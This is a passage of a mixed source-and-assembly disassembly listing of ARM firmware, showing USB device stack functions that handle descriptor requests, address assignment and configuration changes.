 800ba80:	f000 fb27 	bl	800c0d2 <USBD_CtlError>
        err++;
 800ba84:	7afb      	ldrb	r3, [r7, #11]
 800ba86:	3301      	adds	r3, #1
 800ba88:	72fb      	strb	r3, [r7, #11]
      break;
 800ba8a:	e11e      	b.n	800bcca <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800ba8c:	687b      	ldr	r3, [r7, #4]
 800ba8e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800ba92:	681b      	ldr	r3, [r3, #0]
 800ba94:	687a      	ldr	r2, [r7, #4]
 800ba96:	7c12      	ldrb	r2, [r2, #16]
 800ba98:	f107 0108 	add.w	r1, r7, #8
 800ba9c:	4610      	mov	r0, r2
 800ba9e:	4798      	blx	r3
 800baa0:	60f8      	str	r0, [r7, #12]
      break;
 800baa2:	e112      	b.n	800bcca <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800baa4:	687b      	ldr	r3, [r7, #4]
 800baa6:	7c1b      	ldrb	r3, [r3, #16]
 800baa8:	2b00      	cmp	r3, #0
 800baaa:	d10d      	bne.n	800bac8 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800baac:	687b      	ldr	r3, [r7, #4]
 800baae:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bab2:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bab4:	f107 0208 	add.w	r2, r7, #8
 800bab8:	4610      	mov	r0, r2
 800baba:	4798      	blx	r3
 800babc:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800babe:	68fb      	ldr	r3, [r7, #12]
 800bac0:	3301      	adds	r3, #1
 800bac2:	2202      	movs	r2, #2
 800bac4:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bac6:	e100      	b.n	800bcca <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bac8:	687b      	ldr	r3, [r7, #4]
 800baca:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bace:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bad0:	f107 0208 	add.w	r2, r7, #8
 800bad4:	4610      	mov	r0, r2
 800bad6:	4798      	blx	r3
 800bad8:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bada:	68fb      	ldr	r3, [r7, #12]
 800badc:	3301      	adds	r3, #1
 800bade:	2202      	movs	r2, #2
 800bae0:	701a      	strb	r2, [r3, #0]
      break;
 800bae2:	e0f2      	b.n	800bcca <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bae4:	683b      	ldr	r3, [r7, #0]
 800bae6:	885b      	ldrh	r3, [r3, #2]
 800bae8:	b2db      	uxtb	r3, r3
 800baea:	2b05      	cmp	r3, #5
 800baec:	f200 80ac 	bhi.w	800bc48 <USBD_GetDescriptor+0x258>
 800baf0:	a201      	add	r2, pc, #4	; (adr r2, 800baf8 <USBD_GetDescriptor+0x108>)
 800baf2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800baf6:	bf00      	nop
 800baf8:	0800bb11 	.word	0x0800bb11
 800bafc:	0800bb45 	.word	0x0800bb45
 800bb00:	0800bb79 	.word	0x0800bb79
 800bb04:	0800bbad 	.word	0x0800bbad
 800bb08:	0800bbe1 	.word	0x0800bbe1
 800bb0c:	0800bc15 	.word	0x0800bc15
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bb10:	687b      	ldr	r3, [r7, #4]
 800bb12:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb16:	685b      	ldr	r3, [r3, #4]
 800bb18:	2b00      	cmp	r3, #0
 800bb1a:	d00b      	beq.n	800bb34 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bb1c:	687b      	ldr	r3, [r7, #4]
 800bb1e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb22:	685b      	ldr	r3, [r3, #4]
 800bb24:	687a      	ldr	r2, [r7, #4]
 800bb26:	7c12      	ldrb	r2, [r2, #16]
 800bb28:	f107 0108 	add.w	r1, r7, #8
 800bb2c:	4610      	mov	r0, r2
 800bb2e:	4798      	blx	r3
 800bb30:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bb32:	e091      	b.n	800bc58 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bb34:	6839      	ldr	r1, [r7, #0]
 800bb36:	6878      	ldr	r0, [r7, #4]
 800bb38:	f000 facb 	bl	800c0d2 <USBD_CtlError>
            err++;
 800bb3c:	7afb      	ldrb	r3, [r7, #11]
 800bb3e:	3301      	adds	r3, #1
 800bb40:	72fb      	strb	r3, [r7, #11]
          break;
 800bb42:	e089      	b.n	800bc58 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bb44:	687b      	ldr	r3, [r7, #4]
 800bb46:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb4a:	689b      	ldr	r3, [r3, #8]
 800bb4c:	2b00      	cmp	r3, #0
 800bb4e:	d00b      	beq.n	800bb68 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bb50:	687b      	ldr	r3, [r7, #4]
 800bb52:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb56:	689b      	ldr	r3, [r3, #8]
 800bb58:	687a      	ldr	r2, [r7, #4]
 800bb5a:	7c12      	ldrb	r2, [r2, #16]
 800bb5c:	f107 0108 	add.w	r1, r7, #8
 800bb60:	4610      	mov	r0, r2
 800bb62:	4798      	blx	r3
 800bb64:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bb66:	e077      	b.n	800bc58 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bb68:	6839      	ldr	r1, [r7, #0]
 800bb6a:	6878      	ldr	r0, [r7, #4]
 800bb6c:	f000 fab1 	bl	800c0d2 <USBD_CtlError>
            err++;
 800bb70:	7afb      	ldrb	r3, [r7, #11]
 800bb72:	3301      	adds	r3, #1
 800bb74:	72fb      	strb	r3, [r7, #11]
          break;
 800bb76:	e06f      	b.n	800bc58 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800bb78:	687b      	ldr	r3, [r7, #4]
 800bb7a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb7e:	68db      	ldr	r3, [r3, #12]
 800bb80:	2b00      	cmp	r3, #0
 800bb82:	d00b      	beq.n	800bb9c <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bb84:	687b      	ldr	r3, [r7, #4]
 800bb86:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb8a:	68db      	ldr	r3, [r3, #12]
 800bb8c:	687a      	ldr	r2, [r7, #4]
 800bb8e:	7c12      	ldrb	r2, [r2, #16]
 800bb90:	f107 0108 	add.w	r1, r7, #8
 800bb94:	4610      	mov	r0, r2
 800bb96:	4798      	blx	r3
 800bb98:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bb9a:	e05d      	b.n	800bc58 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bb9c:	6839      	ldr	r1, [r7, #0]
 800bb9e:	6878      	ldr	r0, [r7, #4]
 800bba0:	f000 fa97 	bl	800c0d2 <USBD_CtlError>
            err++;
 800bba4:	7afb      	ldrb	r3, [r7, #11]
 800bba6:	3301      	adds	r3, #1
 800bba8:	72fb      	strb	r3, [r7, #11]
          break;
 800bbaa:	e055      	b.n	800bc58 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800bbac:	687b      	ldr	r3, [r7, #4]
 800bbae:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbb2:	691b      	ldr	r3, [r3, #16]
 800bbb4:	2b00      	cmp	r3, #0
 800bbb6:	d00b      	beq.n	800bbd0 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800bbb8:	687b      	ldr	r3, [r7, #4]
 800bbba:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbbe:	691b      	ldr	r3, [r3, #16]
 800bbc0:	687a      	ldr	r2, [r7, #4]
 800bbc2:	7c12      	ldrb	r2, [r2, #16]
 800bbc4:	f107 0108 	add.w	r1, r7, #8
 800bbc8:	4610      	mov	r0, r2
 800bbca:	4798      	blx	r3
 800bbcc:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bbce:	e043      	b.n	800bc58 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bbd0:	6839      	ldr	r1, [r7, #0]
 800bbd2:	6878      	ldr	r0, [r7, #4]
 800bbd4:	f000 fa7d 	bl	800c0d2 <USBD_CtlError>
            err++;
 800bbd8:	7afb      	ldrb	r3, [r7, #11]
 800bbda:	3301      	adds	r3, #1
 800bbdc:	72fb      	strb	r3, [r7, #11]
          break;
 800bbde:	e03b      	b.n	800bc58 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bbe0:	687b      	ldr	r3, [r7, #4]
 800bbe2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbe6:	695b      	ldr	r3, [r3, #20]
 800bbe8:	2b00      	cmp	r3, #0
 800bbea:	d00b      	beq.n	800bc04 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bbec:	687b      	ldr	r3, [r7, #4]
 800bbee:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbf2:	695b      	ldr	r3, [r3, #20]
 800bbf4:	687a      	ldr	r2, [r7, #4]
 800bbf6:	7c12      	ldrb	r2, [r2, #16]
 800bbf8:	f107 0108 	add.w	r1, r7, #8
 800bbfc:	4610      	mov	r0, r2
 800bbfe:	4798      	blx	r3
 800bc00:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc02:	e029      	b.n	800bc58 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc04:	6839      	ldr	r1, [r7, #0]
 800bc06:	6878      	ldr	r0, [r7, #4]
 800bc08:	f000 fa63 	bl	800c0d2 <USBD_CtlError>
            err++;
 800bc0c:	7afb      	ldrb	r3, [r7, #11]
 800bc0e:	3301      	adds	r3, #1
 800bc10:	72fb      	strb	r3, [r7, #11]
          break;
 800bc12:	e021      	b.n	800bc58 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bc14:	687b      	ldr	r3, [r7, #4]
 800bc16:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc1a:	699b      	ldr	r3, [r3, #24]
 800bc1c:	2b00      	cmp	r3, #0
 800bc1e:	d00b      	beq.n	800bc38 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bc20:	687b      	ldr	r3, [r7, #4]
 800bc22:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc26:	699b      	ldr	r3, [r3, #24]
 800bc28:	687a      	ldr	r2, [r7, #4]
 800bc2a:	7c12      	ldrb	r2, [r2, #16]
 800bc2c:	f107 0108 	add.w	r1, r7, #8
 800bc30:	4610      	mov	r0, r2
 800bc32:	4798      	blx	r3
 800bc34:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc36:	e00f      	b.n	800bc58 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc38:	6839      	ldr	r1, [r7, #0]
 800bc3a:	6878      	ldr	r0, [r7, #4]
 800bc3c:	f000 fa49 	bl	800c0d2 <USBD_CtlError>
            err++;
 800bc40:	7afb      	ldrb	r3, [r7, #11]
 800bc42:	3301      	adds	r3, #1
 800bc44:	72fb      	strb	r3, [r7, #11]
          break;
 800bc46:	e007      	b.n	800bc58 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bc48:	6839      	ldr	r1, [r7, #0]
 800bc4a:	6878      	ldr	r0, [r7, #4]
 800bc4c:	f000 fa41 	bl	800c0d2 <USBD_CtlError>
          err++;
 800bc50:	7afb      	ldrb	r3, [r7, #11]
 800bc52:	3301      	adds	r3, #1
 800bc54:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bc56:	bf00      	nop
      }
      break;
 800bc58:	e037      	b.n	800bcca <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bc5a:	687b      	ldr	r3, [r7, #4]
 800bc5c:	7c1b      	ldrb	r3, [r3, #16]
 800bc5e:	2b00      	cmp	r3, #0
 800bc60:	d109      	bne.n	800bc76 <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bc62:	687b      	ldr	r3, [r7, #4]
 800bc64:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bc68:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bc6a:	f107 0208 	add.w	r2, r7, #8
 800bc6e:	4610      	mov	r0, r2
 800bc70:	4798      	blx	r3
 800bc72:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bc74:	e029      	b.n	800bcca <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bc76:	6839      	ldr	r1, [r7, #0]
 800bc78:	6878      	ldr	r0, [r7, #4]
 800bc7a:	f000 fa2a 	bl	800c0d2 <USBD_CtlError>
        err++;
 800bc7e:	7afb      	ldrb	r3, [r7, #11]
 800bc80:	3301      	adds	r3, #1
 800bc82:	72fb      	strb	r3, [r7, #11]
      break;
 800bc84:	e021      	b.n	800bcca <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bc86:	687b      	ldr	r3, [r7, #4]
 800bc88:	7c1b      	ldrb	r3, [r3, #16]
 800bc8a:	2b00      	cmp	r3, #0
 800bc8c:	d10d      	bne.n	800bcaa <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bc8e:	687b      	ldr	r3, [r7, #4]
 800bc90:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bc94:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bc96:	f107 0208 	add.w	r2, r7, #8
 800bc9a:	4610      	mov	r0, r2
 800bc9c:	4798      	blx	r3
 800bc9e:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bca0:	68fb      	ldr	r3, [r7, #12]
 800bca2:	3301      	adds	r3, #1
 800bca4:	2207      	movs	r2, #7
 800bca6:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bca8:	e00f      	b.n	800bcca <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bcaa:	6839      	ldr	r1, [r7, #0]
 800bcac:	6878      	ldr	r0, [r7, #4]
 800bcae:	f000 fa10 	bl	800c0d2 <USBD_CtlError>
        err++;
 800bcb2:	7afb      	ldrb	r3, [r7, #11]
 800bcb4:	3301      	adds	r3, #1
 800bcb6:	72fb      	strb	r3, [r7, #11]
      break;
 800bcb8:	e007      	b.n	800bcca <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bcba:	6839      	ldr	r1, [r7, #0]
 800bcbc:	6878      	ldr	r0, [r7, #4]
 800bcbe:	f000 fa08 	bl	800c0d2 <USBD_CtlError>
      err++;
 800bcc2:	7afb      	ldrb	r3, [r7, #11]
 800bcc4:	3301      	adds	r3, #1
 800bcc6:	72fb      	strb	r3, [r7, #11]
      break;
 800bcc8:	bf00      	nop
  }

  if (err != 0U)
 800bcca:	7afb      	ldrb	r3, [r7, #11]
 800bccc:	2b00      	cmp	r3, #0
 800bcce:	d11e      	bne.n	800bd0e <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bcd0:	683b      	ldr	r3, [r7, #0]
 800bcd2:	88db      	ldrh	r3, [r3, #6]
 800bcd4:	2b00      	cmp	r3, #0
 800bcd6:	d016      	beq.n	800bd06 <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bcd8:	893b      	ldrh	r3, [r7, #8]
 800bcda:	2b00      	cmp	r3, #0
 800bcdc:	d00e      	beq.n	800bcfc <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bcde:	683b      	ldr	r3, [r7, #0]
 800bce0:	88da      	ldrh	r2, [r3, #6]
 800bce2:	893b      	ldrh	r3, [r7, #8]
 800bce4:	4293      	cmp	r3, r2
 800bce6:	bf28      	it	cs
 800bce8:	4613      	movcs	r3, r2
 800bcea:	b29b      	uxth	r3, r3
 800bcec:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bcee:	893b      	ldrh	r3, [r7, #8]
 800bcf0:	461a      	mov	r2, r3
 800bcf2:	68f9      	ldr	r1, [r7, #12]
 800bcf4:	6878      	ldr	r0, [r7, #4]
 800bcf6:	f000 fa5d 	bl	800c1b4 <USBD_CtlSendData>
 800bcfa:	e009      	b.n	800bd10 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800bcfc:	6839      	ldr	r1, [r7, #0]
 800bcfe:	6878      	ldr	r0, [r7, #4]
 800bd00:	f000 f9e7 	bl	800c0d2 <USBD_CtlError>
 800bd04:	e004      	b.n	800bd10 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800bd06:	6878      	ldr	r0, [r7, #4]
 800bd08:	f000 faae 	bl	800c268 <USBD_CtlSendStatus>
 800bd0c:	e000      	b.n	800bd10 <USBD_GetDescriptor+0x320>
    return;
 800bd0e:	bf00      	nop
  }
}
 800bd10:	3710      	adds	r7, #16
 800bd12:	46bd      	mov	sp, r7
 800bd14:	bd80      	pop	{r7, pc}
 800bd16:	bf00      	nop

0800bd18 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bd18:	b580      	push	{r7, lr}
 800bd1a:	b084      	sub	sp, #16
 800bd1c:	af00      	add	r7, sp, #0
 800bd1e:	6078      	str	r0, [r7, #4]
 800bd20:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800bd22:	683b      	ldr	r3, [r7, #0]
 800bd24:	889b      	ldrh	r3, [r3, #4]
 800bd26:	2b00      	cmp	r3, #0
 800bd28:	d131      	bne.n	800bd8e <USBD_SetAddress+0x76>
 800bd2a:	683b      	ldr	r3, [r7, #0]
 800bd2c:	88db      	ldrh	r3, [r3, #6]
 800bd2e:	2b00      	cmp	r3, #0
 800bd30:	d12d      	bne.n	800bd8e <USBD_SetAddress+0x76>
 800bd32:	683b      	ldr	r3, [r7, #0]
 800bd34:	885b      	ldrh	r3, [r3, #2]
 800bd36:	2b7f      	cmp	r3, #127	; 0x7f
 800bd38:	d829      	bhi.n	800bd8e <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800bd3a:	683b      	ldr	r3, [r7, #0]
 800bd3c:	885b      	ldrh	r3, [r3, #2]
 800bd3e:	b2db      	uxtb	r3, r3
 800bd40:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bd44:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bd46:	687b      	ldr	r3, [r7, #4]
 800bd48:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bd4c:	b2db      	uxtb	r3, r3
 800bd4e:	2b03      	cmp	r3, #3
 800bd50:	d104      	bne.n	800bd5c <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800bd52:	6839      	ldr	r1, [r7, #0]
 800bd54:	6878      	ldr	r0, [r7, #4]
 800bd56:	f000 f9bc 	bl	800c0d2 <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bd5a:	e01d      	b.n	800bd98 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800bd5c:	687b      	ldr	r3, [r7, #4]
 800bd5e:	7bfa      	ldrb	r2, [r7, #15]
 800bd60:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800bd64:	7bfb      	ldrb	r3, [r7, #15]
 800bd66:	4619      	mov	r1, r3
 800bd68:	6878      	ldr	r0, [r7, #4]
 800bd6a:	f000 ffbf 	bl	800ccec <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800bd6e:	6878      	ldr	r0, [r7, #4]
 800bd70:	f000 fa7a 	bl	800c268 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800bd74:	7bfb      	ldrb	r3, [r7, #15]
 800bd76:	2b00      	cmp	r3, #0
 800bd78:	d004      	beq.n	800bd84 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bd7a:	687b      	ldr	r3, [r7, #4]
 800bd7c:	2202      	movs	r2, #2
 800bd7e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bd82:	e009      	b.n	800bd98 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800bd84:	687b      	ldr	r3, [r7, #4]
 800bd86:	2201      	movs	r2, #1
 800bd88:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bd8c:	e004      	b.n	800bd98 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800bd8e:	6839      	ldr	r1, [r7, #0]
 800bd90:	6878      	ldr	r0, [r7, #4]
 800bd92:	f000 f99e 	bl	800c0d2 <USBD_CtlError>
  }
}
 800bd96:	bf00      	nop
 800bd98:	bf00      	nop
 800bd9a:	3710      	adds	r7, #16
 800bd9c:	46bd      	mov	sp, r7
 800bd9e:	bd80      	pop	{r7, pc}

0800bda0 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bda0:	b580      	push	{r7, lr}
 800bda2:	b084      	sub	sp, #16
 800bda4:	af00      	add	r7, sp, #0
 800bda6:	6078      	str	r0, [r7, #4]
 800bda8:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800bdaa:	2300      	movs	r3, #0
 800bdac:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800bdae:	683b      	ldr	r3, [r7, #0]
 800bdb0:	885b      	ldrh	r3, [r3, #2]
 800bdb2:	b2da      	uxtb	r2, r3
 800bdb4:	4b4e      	ldr	r3, [pc, #312]	; (800bef0 <USBD_SetConfig+0x150>)
 800bdb6:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800bdb8:	4b4d      	ldr	r3, [pc, #308]	; (800bef0 <USBD_SetConfig+0x150>)
 800bdba:	781b      	ldrb	r3, [r3, #0]
 800bdbc:	2b01      	cmp	r3, #1
 800bdbe:	d905      	bls.n	800bdcc <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800bdc0:	6839      	ldr	r1, [r7, #0]
 800bdc2:	6878      	ldr	r0, [r7, #4]
 800bdc4:	f000 f985 	bl	800c0d2 <USBD_CtlError>
    return USBD_FAIL;
 800bdc8:	2303      	movs	r3, #3
 800bdca:	e08c      	b.n	800bee6 <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800bdcc:	687b      	ldr	r3, [r7, #4]
 800bdce:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bdd2:	b2db      	uxtb	r3, r3
 800bdd4:	2b02      	cmp	r3, #2
 800bdd6:	d002      	beq.n	800bdde <USBD_SetConfig+0x3e>
 800bdd8:	2b03      	cmp	r3, #3
 800bdda:	d029      	beq.n	800be30 <USBD_SetConfig+0x90>
 800bddc:	e075      	b.n	800beca <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800bdde:	4b44      	ldr	r3, [pc, #272]	; (800bef0 <USBD_SetConfig+0x150>)
 800bde0:	781b      	ldrb	r3, [r3, #0]
 800bde2:	2b00      	cmp	r3, #0
 800bde4:	d020      	beq.n	800be28 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800bde6:	4b42      	ldr	r3, [pc, #264]	; (800bef0 <USBD_SetConfig+0x150>)
 800bde8:	781b      	ldrb	r3, [r3, #0]
 800bdea:	461a      	mov	r2, r3
 800bdec:	687b      	ldr	r3, [r7, #4]
 800bdee:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bdf0:	4b3f      	ldr	r3, [pc, #252]	; (800bef0 <USBD_SetConfig+0x150>)
 800bdf2:	781b      	ldrb	r3, [r3, #0]
 800bdf4:	4619      	mov	r1, r3
 800bdf6:	6878      	ldr	r0, [r7, #4]
 800bdf8:	f7ff f848 	bl	800ae8c <USBD_SetClassConfig>
 800bdfc:	4603      	mov	r3, r0
 800bdfe:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800be00:	7bfb      	ldrb	r3, [r7, #15]
 800be02:	2b00      	cmp	r3, #0
 800be04:	d008      	beq.n	800be18 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800be06:	6839      	ldr	r1, [r7, #0]
 800be08:	6878      	ldr	r0, [r7, #4]
 800be0a:	f000 f962 	bl	800c0d2 <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800be0e:	687b      	ldr	r3, [r7, #4]
 800be10:	2202      	movs	r2, #2
 800be12:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800be16:	e065      	b.n	800bee4 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800be18:	6878      	ldr	r0, [r7, #4]
 800be1a:	f000 fa25 	bl	800c268 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800be1e:	687b      	ldr	r3, [r7, #4]
 800be20:	2203      	movs	r2, #3
 800be22:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800be26:	e05d      	b.n	800bee4 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800be28:	6878      	ldr	r0, [r7, #4]
 800be2a:	f000 fa1d 	bl	800c268 <USBD_CtlSendStatus>
      break;
